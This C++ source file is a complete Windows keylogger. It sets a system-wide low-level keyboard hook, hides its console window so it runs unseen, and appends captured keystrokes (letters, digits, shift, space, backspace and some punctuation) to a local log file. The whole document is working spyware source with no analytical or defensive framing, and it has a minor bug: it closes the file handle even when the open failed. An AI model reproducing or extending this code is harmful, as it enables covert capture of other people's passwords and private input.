#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#pragma comment(lib, "User32.lib")
HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
{
	kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	if (nCode >= 0)
	{
		FILE *file;
		file = fopen("log.txt", "a+");
		if (file == NULL)
			wprintf(TEXT("Unable to open file\n"));
		else
		{
			if (wParam == WM_KEYDOWN)
			{
				if (kbdStruct.vkCode == VK_BACK)
					fprintf(file, "[BACK SPACE] ");
					// MessageBox(NULL, L"back space", L"hello world", MB_ICONINFORMATION);
				if (kbdStruct.vkCode == VK_TAB)
					fprintf(file, "[TAB] ");
				if (kbdStruct.vkCode >= 0x30 && kbdStruct.vkCode <= 0x39)
					fprintf(file, "%d ", kbdStruct.vkCode - 48);
				if (kbdStruct.vkCode >= 0x41 && kbdStruct.vkCode <= 0x5A)
					fprintf(file, "%c ", kbdStruct.vkCode);
				if (kbdStruct.vkCode == 0xA0 || kbdStruct.vkCode == 0xA1)
					fprintf(file, "[SHIFT] ");
				if (kbdStruct.vkCode == VK_SPACE)
					fprintf(file, "[SPACE BAR] ");
				if (kbdStruct.vkCode == VK_OEM_1)
					fprintf(file, "[;] ");
				if (kbdStruct.vkCode == VK_OEM_COMMA)
					fprintf(file, "[,] ");
			}
		}
		fclose(file);
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}
void SetHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
		wprintf(TEXT("Failed!"));
}
void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	SetHook();
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	ReleaseHook();
	return 0;
}
